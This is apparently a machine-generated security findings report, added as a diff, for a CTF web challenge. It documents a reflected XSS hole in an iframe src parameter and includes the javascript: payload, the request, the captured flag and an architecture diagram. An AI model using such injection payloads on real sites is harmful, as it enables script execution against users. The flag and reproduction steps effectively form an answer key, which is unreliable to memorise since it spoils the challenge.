@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T21:36:42.269457+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "e098b1f9-af4e-4806-bca3-254d87bc264d",
+      "timestamp": "2026-04-12T21:36:42.269337+00:00",
+      "title": "Reflected XSS via iframe src injection \u2014 CTF flag extracted",
+      "severity": "critical",
+      "target": "http://172.17.0.1:40039/page?url=javascript:alert('XSS')",
+      "description": "The /page endpoint reflects the `url` GET parameter directly into an iframe `src` attribute without sanitization. Supplying `javascript:alert('XSS')` as the URL value executes arbitrary JavaScript in the iframe context, bypassing any content restrictions. The server validates the XSS payload server-side and returns the CTF flag upon success.",
+      "evidence": "GET /page?url=javascript:alert('XSS') HTTP/1.1\n\nResponse includes:\nflag{7aa5167c-aaad-4587-b76c-044ae6107e7a}\n\nFull iframe tag in response: <iframe src=\"javascript:alert('XSS')\"></iframe>\nSuccess message: Congratulations! Here is the flag: flag{7aa5167c-aaad-4587-b76c-044ae6107e7a}",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET http://172.17.0.1:40039/page?url=javascript:alert('XSS')",
+        "expected": "flag{7aa5167c-aaad-4587-b76c-044ae6107e7a}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "9492f5f2-4b3f-42b3-a034-b8a9fc02b111",
+      "timestamp": "2026-04-12T21:36:48.339773+00:00",
+      "title": "Dalgona Challenges - Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser / Attacker\"] --> Home[\"GET / - Index Page\"]\n  Home --> PageLink[\"Link to /page\"]\n  Browser --> PageEndpoint[\"GET /page?url=FUZZ\"]\n  PageEndpoint --> IframeSrc[\"iframe src=url param (unsanitized)\"]\n  IframeSrc --> XSS[\"javascript:alert('XSS') - XSS triggered\"]\n  XSS --> Flag[\"flag{7aa5167c-aaad-4587-b76c-044ae6107e7a}\"]\n  PageEndpoint --> Static[\"Static assets /static/\"]"
+    }
+  ]
+}
